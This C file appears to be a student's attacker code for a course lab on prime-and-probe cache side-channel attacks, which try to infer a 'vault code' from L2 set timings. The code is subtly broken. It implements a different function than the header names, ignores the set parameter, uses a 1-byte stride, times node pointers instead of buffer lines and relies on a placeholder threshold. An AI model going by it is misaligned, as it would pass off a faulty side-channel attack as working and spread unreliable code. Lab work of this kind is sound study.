/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 *
 *  thief.c is the attacker implementation. You need to add the code for 
 *  prime_probe_l2_set_new()
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>

// struct for traversal of eviction linked list
typedef struct node {
	char *bufData;
    struct node* next;
    CYCLES timestamp;
} node_t;

// Initialize and allocate the eviction linked list
node_t* init_eviction_list(char* buf, int buf_size, int stride) {
    node_t* head = malloc(sizeof(node_t));
	head->bufData = buf;
    node_t* current = head;
    char* ptr = buf;
    int num_nodes = buf_size / stride;
    for (int i = 1; i < num_nodes; i++) {
		node_t *new = malloc(sizeof(node_t));
        ptr += stride;
        new->bufData = ptr;
		current->next = new;
        current = new;
    }
    current->next = head; // Make it circular
    return head;
}

//frees allocated list memory
void free_eviction_list(node_t *list) {
	node_t *start = list;
	if (start == NULL) return;
	else if (start->next == start) {
		free(start);
		return;
	}
	node_t *ptr = start->next;
	while (ptr != start) {
		node_t *tmp = ptr;
		ptr = ptr->next;
		free(tmp);
	}
	free(start);
}

// you will need to generate an eviction linked list structure with next,
// previous pointers and time measurements
// then you can use the shuffle function to randomize the access pattern 
// and avoid prefetchers being activated
// then traverse the list for prime and probe
// you might want to consider adding some delay between steps
// finally you need to traverse the list one more time to retrieve 
// the time measurements
bool prime_probe_l2_set(int set, char *buf) {
    bool found = false;

    //system information
    const int buf_size = 4096 * 512;
    const int stride = 1; //step stride len

    // Initialize the eviction linked list
    node_t* head = init_eviction_list(buf, buf_size, stride);
    node_t* current = head;

    // Prime phase: Access each node to load it into cache
    do {
		//access
		measure_line_access_time(current->bufData);
        current = current->next;
    } while (current != head);

    // Insert delay here if needed

    // Probe phase: Measure access times
    uint64_t start, end;
    do {
		CYCLES cycles = measure_line_access_time((ADDR_PTR)current->next);
        current->timestamp = cycles;
        current = current->next;
    } while (current != head);

    // Example analysis (very simplistic, just for demonstration)
    uint64_t threshold = 200; // Threshold for determining a cache miss, needs calibration
    current = head;
    do {
        if (current->timestamp > threshold) {
            found = true;
            break;
        }
        current = current->next;
    } while (current != head);

	free_eviction_list(head);

    return found;
}

int main(int argc, char const *argv[]) {
    void *buf = NULL;
    int buf_size = 1 << 21;
    if (posix_memalign(&buf, 1 << 21, buf_size)) {
        perror("posix_memalign");
    }
    madvise(buf, buf_size, MADV_HUGEPAGE);
    *((char *)buf) = 5;

    int evict_count[L2_SETS];
    for (int i = 0; i < L2_SETS; i++) {
        evict_count[i] = 0;
    }

    int num_reps = 10;
    for (int rep = 0; rep < num_reps; rep++) {
        for (int set = 0; set < L2_SETS; set++) {
            if (prime_probe_l2_set(set, buf)) {
                evict_count[set]++;
            }
        }
		printf("rep\n");
    }


    int max_val = -1;
    int max_set = -1;
    for (int set = 0; set < L2_SETS; set++) {
        if (evict_count[set] > max_val) {
            max_val = evict_count[set];
            max_set = set;
        }
    }
    printf("Vault code: %d (%d)\n", max_set, max_val);
}
